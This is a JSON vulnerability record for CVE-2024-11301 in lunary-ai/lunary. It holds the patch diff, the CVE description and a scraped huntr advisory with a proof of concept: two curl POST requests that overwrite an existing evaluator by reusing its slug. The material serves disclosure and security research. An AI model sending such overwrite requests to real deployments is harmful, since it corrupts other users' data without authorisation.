{
    "CVE-2024-11301": {
        "published_date": "2025-03-20T10:10:00.614Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/79dc370596d979b756f6ea0250d97a2d02385ecd",
                "content": "fix: security patches (#654)\n\nFilename: packages/backend/src/api/v1/template-versions.ts:\n```\n@@ -96,16 +96,18 @@\nversions.get(\"/latest\", async (ctx: Context) => {\n versions.get(\"/:id\", async (ctx: Context) => {\n   const { id: versionId } = ctx.params;\n   const { projectId } = ctx.state;\n+  console.log(\"projectId\", projectId);\n \n   const [version] = await sql`\n     select\n       tv.*\n     from\n       template_version tv\n       left join template t on tv.template_id = t.id\n-      left join project p on t.project_id = p.id and p.id = ${projectId}\n+      left join project p on t.project_id = p.id \n     where\n       tv.id = ${versionId}\n+      and p.id = ${projectId}\n   `;\n   if (!version) {\n     ctx.throw(401, \"You do not have access to this ressource.\");\n```\n\nFilename: packages/db/0051.sql:\n```\n@@ -0,0 +1 @@\n+alter table evaluator add constraint evaluator_project_id_slug_unique unique (project_id, slug);\n\\ No newline at end of file\n```"
            }
        ],
        "sw_version": "v1.6.2",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.6.2.zip",
        "description": "In lunary-ai/lunary before version 1.6.3, the application allows the creation of evaluators without enforcing a unique constraint on the combination of projectId and slug. This allows an attacker to overwrite existing data by submitting a POST request with the same slug as an existing evaluator. The lack of database constraints or application-layer validation to prevent duplicates exposes the application to data integrity issues. This vulnerability can result in corrupted data and potentially malicious actions, impairing the system's functionality.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/3d99aca5-b135-4833-b48b-7806bc4bf861",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nLack of unique constraint validation allows overwriting evaluators in lunary-ai/lunary\nValid\nReported on Nov 14th 2024\nDescription\nThe application allows the creation of evaluators without enforcing a unique constraint on the combination of projectId and slug. This allows an attacker to overwrite existing data by submitting a POST request with the same slug as an existing evaluator. Since the backend lacks database constraints or application-layer validation to prevent duplicates, this exposes the application to data integrity issues.\nProof of Concept\nEnsure the application is running. Open the dashboard, inspect a request, copy the bearer token and project id.\nCreate an Initial Evaluator\ncurl -X POST \"http://localhost:3000/api/v1/evaluators/\" \\\n    -H \"Content-Type: application/json\" \\\n    -H \"Authorization: Bearer YourToken\" \\\n    -d '{\n        \"projectId\": \"proj123\",\n        \"slug\": \"evaluator-a\",\n        \"name\": \"Original Evaluator\",\n        \"type\": \"geval\",\n        \"mode\": \"normal\",\n        \"params\": {},\n        \"filters\": []\n    }'\nCreate Another Evaluator with the same slug\ncurl -X POST \"http://localhost:3000/api/v1/evaluators/\" \\\n    -H \"Content-Type: application/json\" \\\n    -H \"Authorization: Bearer YourToken\" \\\n    -d '{\n        \"projectId\": \"proj123\",\n        \"slug\": \"evaluator-a\",\n        \"name\": \"Malicious Evaluator\",\n        \"type\": \"geval\",\n        \"mode\": \"normal\",\n        \"params\": {\"param1\": \"maliciousValue\"},\n        \"filters\": ['AND', {\"filter1\": \"maliciousFilter\"}]\n    }'\nThe evaluator with slug: \"evaluator-a\" is overwritten.\nImpact\nExisting evaluator records can be replaced with attacker-controlled data, resulting in corrupted data and potentially malicious actions as some evaluators are LLM-run. If critical evaluators are overwritten used for other parts of the app (like enriching of runs), the system’s functionality can be impaired.\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.6 months ago\nhuntr-helpermodified the Severity from High (7.1) to Medium (6.5)6 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nHugues Chocart validated this vulnerability6 months ago\nantonin36330has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-11301assigned to this report.6 months ago\nHugues Chocartmarked this as fixedin 1.6.3with commit79dc376 months ago\nHugues Chocarthas been awarded the fix bounty\nWe have notified the lunary-ai/lunary maintainers about this report in their weekly follow-up3 months ago\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hours3 months ago\nThis vulnerability has now been published3 months ago\nCVE-2024-11301has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-11301\n(Published)\nVulnerability Type\nCWE-837: Improper Enforcement of a Single, Unique Action\nSeverity\nMedium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nv1.6.2\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$75\nFix Bounty\n$18.75\nFound by\nantonin36330\n@antonin36330\nLIGHTWEIGHT\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a proof of concept with specific steps and commands to demonstrate the described vulnerability, including the API endpoint and payload."
            }
        ],
        "cwe": [
            {
                "id": "CWE-837",
                "value": "CWE-837 Improper Enforcement of a Single, Unique Action"
            }
        ]
    }
}